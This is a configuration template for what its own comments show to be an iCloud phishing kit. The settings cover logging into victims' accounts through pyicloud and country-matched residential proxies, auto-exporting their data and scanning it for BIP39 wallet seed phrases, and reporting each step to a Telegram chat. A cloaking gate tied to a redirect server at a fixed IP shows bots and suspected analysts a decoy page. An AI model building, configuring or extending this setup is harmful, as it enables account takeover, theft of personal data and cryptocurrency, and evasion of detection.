# ---------------------------------------------------------------------------
# Copy to .env and edit.  Every value has a working default in server/config.js,
# so an empty file is fine for local development.
# ---------------------------------------------------------------------------

NODE_ENV=development

# Express: serves dist/ and /api/geo
PORT=3000

# Socket.IO: separate process + port (server/socket/index.js)
SOCKET_PORT=4001
# Comma-separated origins, or * for development.
SOCKET_CORS_ORIGIN=*

# Password for the /admin namespace.  REQUIRED in production; change it.
ADMIN_PASSWORD=change-me-admin

# Where `npm run build` writes the React app.
DIST_DIR=dist

# ---------------------------------------------------------------------------
# Geo lookup (/api/geo)
# ---------------------------------------------------------------------------
# Rotating outbound proxies, comma-separated.  Both HTTP and HTTPS proxies work:
#   GEO_PROXIES=http://user:pass@proxy1:8080,http://user:pass@proxy2:8080
GEO_PROXIES=

# If all proxies fail, ask the provider directly (free APIs rate-limit by IP).
GEO_ALLOW_DIRECT=true

# Trust Cloudflare / Vercel country headers and skip the provider call.
GEO_TRUST_COUNTRY_HEADER=true

GEO_TIMEOUT_MS=4500
GEO_CACHE_TTL_MS=43200000
GEO_NEGATIVE_CACHE_TTL_MS=60000
GEO_MAX_ATTEMPTS=3

# ---------------------------------------------------------------------------
# Telegram bot (grammY) — optional
# ---------------------------------------------------------------------------
TELEGRAM_ENABLED=false
# Comma-separated bot tokens.  tokens[0] answers commands; every token is used
# round-robin for cards and step logs.  TELEGRAM_BOT_TOKEN still works alone.
TELEGRAM_BOT_TOKENS=
TELEGRAM_BOT_TOKEN=
# Chat/group that receives cards and every step log.
TELEGRAM_CHAT_ID=
# Optional comma-separated Telegram user ids allowed to use the bot.
TELEGRAM_ALLOWED_USERS=

# ---------------------------------------------------------------------------
# Store
# ---------------------------------------------------------------------------
STORE_FILE=server/data/items.json
STORE_SEED=true

# Optional override.  In production the page uses its own origin, so every
# page domain proxies /socket.io to the socket process.  Set this only when
# the socket lives on a different host.
# VITE_SOCKET_URL=https://socket.example.com

# ---------------------------------------------------------------------------
# Python worker (pyicloud) — optional for the real login flow
# ---------------------------------------------------------------------------
WORKER_TOKEN=change-me
WORKER_URL=http://127.0.0.1:4001
# Residential sticky proxy. Country + stable session are added per account.
ANYIP_PROXY_URL=http://user:pass@portal.anyip.io:1080
MAX_AUTH_JOBS=10
MAX_EXPORT_JOBS=4
MAX_QUEUE=500
# Start the resumable export as soon as login succeeds (true) or only when
# the operator/victim triggers it (false).
AUTO_EXPORT_AFTER_AUTH=true
# After an export completes, run the OCR/BIP39 scan automatically and post the
# summary (files, images, tier counts) to Telegram.
AUTO_SCAN_AFTER_EXPORT=true
EXPORT_DIR=./export
SESSIONS_DIR=./sessions
KEEPALIVE_HOURS=5
# Used only when the victim country has no proxy peer.
ICLOUD_PROXY_FALLBACK_COUNTRY=

# ---------------------------------------------------------------------------
# Page gate (server/gate.js) — only a pass from the redirect opens the page
# ---------------------------------------------------------------------------
# The redirect runs on a separate box (82.221.141.250), so the page redeems
# over its HTTP API. GATE_SECRET MUST equal the redirect's SHARED_SECRET.
GATE_MODE=http
GATE_REDEEM_URL=http://82.221.141.250/api/redeem
GATE_STATUS_URL=http://82.221.141.250/api/status
GATE_SECRET=replace-with-the-redirects-SHARED_SECRET

# Same server as the redirect: share its SQLite file instead of HTTP.
# GATE_MODE=db
# GATE_DB_PATH=/srv/redirect_icloud/data/gate.db

GATE_DECOY_URL=https://www.icloud.com/
GATE_SESSION_HOURS=12
GATE_IP_MODE=strict
# 1 = accept a v4/v6 pair for the same visitor (IPv4-only redirect,
# dual-stack page behind Cloudflare). UA + fingerprint still bind.
GATE_IP_CROSS_FAMILY=1
GATE_MID_SESSION_CHECK=1
GATE_SUSPECT_MODE=decoy
GATE_SUSPECT_THRESHOLD=3
# 0 answers a direct crawler/curl with the iCloud 302; 1 gives it a quiet page.
GATE_BOT_QUIET=0
# auto | cloudflare | nginx | none — must match the real edge.
EDGE_PROXY=auto

# The only two ways to open the page without a redirect pass.
# Generate the token with: openssl rand -hex 24
GATE_ADMIN_IPS=
GATE_ADMIN_TOKEN=

# Front-end mock mode for the visual flow test (no worker needed).
# VITE_MOCK_AUTH=1
